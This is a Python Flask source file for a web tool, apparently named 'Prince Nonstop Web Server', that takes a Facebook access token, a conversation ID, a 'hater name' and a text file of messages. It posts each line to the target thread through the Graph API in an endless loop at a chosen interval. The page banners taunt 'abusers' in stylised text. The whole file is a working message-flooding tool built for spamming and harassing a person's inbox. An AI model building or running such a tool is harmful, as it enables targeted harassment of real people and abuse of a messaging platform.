from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Prince Onfire</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <html>
    <head>
        <style>
        body {
        background-image: url('https://picjj.com/images/2024/05/11/NTfMo.jpg');
        background-size: cover;
    }
    body {
      font-family: Arial, sans-serif;
    }
    
    	.container{
			max-width: 500px;
			background-color:#99F1FF;
			border-radius: 20px;
			padding: 20px;
			box-shadow: 0 0 10px rgba(0, 0, 0, 0.1)
    
    .container label, .container input[type="text"], .container input[type="password"] {
      display: black;
      width: 100%;
      margin-bottom: 10px;
    }
    
    .container button {
      width: 100%;
      padding: 10px;
      background-color: #1CAF50;
      color: white;
      border: none;
      cursor: pointer;
    }

    .container button:hover {
      background-color: #55a049;
    }
  </style>
    </head>
    <body>
  <header class="header mt-4">\
    <h1 class="mb-3" style="color: Yellow;"> (- 💛 𝐏𝐑𝟏𝐍𝐂𝐄 𝐍𝟎𝐍𝐒𝐓𝐎𝐏 𝐖𝟑𝐁 𝐒𝟑𝐑𝐕𝟑𝐑 👀 -)</h1>
    <h1 class="mt-3" style="color: Yellow;"> (- 😈 𝐆𝟎𝐃 𝐀𝐁𝐔𝐒𝟑𝐑𝐒 𝐊𝟏 𝐌𝟒 𝐊𝟏 () 👿 -)</h1>
    <h1 class="mt-3" style="color: Yellow;"> (- 😌𝐓𝐔𝐉𝐇𝟑 𝐌𝟏𝐋 𝐆𝐘𝟒 𝐇𝟒𝟒𝟏 𝐓𝟎 𝐓𝐔 𝐄𝐍𝐉𝟎𝐘 𝐊𝟒𝐑 𝐍𝟎𝐍-𝐒𝟑𝐑𝐕𝟑𝐑 𝐊𝟏𝐒𝟏 𝐊𝟎 𝐃𝟑𝐍𝟒 𝐌𝟒𝟒𝐓-𝐖𝟒𝐑𝐍𝟒 𝐏𝟒𝐒𝐖𝟎𝐑𝐃 𝐂𝐇𝐍𝐆𝟑 𝐊𝐑 𝐃𝟕𝐍𝐆𝟒 ✅ -)
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="accessToken">𝙀𝙉𝙏𝙀𝙍 𝙔𝙊𝙐𝙍 𝙏𝙊𝙆𝙀𝙉 :</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
      </div>
      <div class="mb-3">
        <label for="threadId">𝙀𝙉𝙏𝙀𝙍 𝘾𝙊𝙉𝙑𝙊/𝙄𝙉𝘽𝙊𝙓 𝙄𝘿 :</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">𝙀𝙉𝙏𝙀𝙍 𝙃𝘼𝙏𝙀𝙍  𝙉𝘼𝙈𝙀 :</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">𝙎𝙀𝙇𝙀𝘾𝙏 𝙔𝙊𝙐𝙍 𝙉𝙊𝙏𝙀𝙋𝘼𝘿 𝙁𝙄𝙇𝙀 :</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time">𝙎𝙋𝙀𝙀𝘿 𝙄𝙉 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 :</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">𝙎𝙐𝘽𝙈𝙄𝙏 𝙔𝙊𝙐𝙍 𝘿𝙀𝙏𝘼𝙄𝙇𝙎 </button>
    </form>
  </div>
  <footer class="footer">
    <p>&copy; Developed by Prince  2024. All Rights Reserved.</p>
    <p>Convo/Inbox Loader Tool</p>
    <p>Keep enjoying  <a href="https://github.com/Prince</a></p>
  </footer>
</body>
  </html>
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)
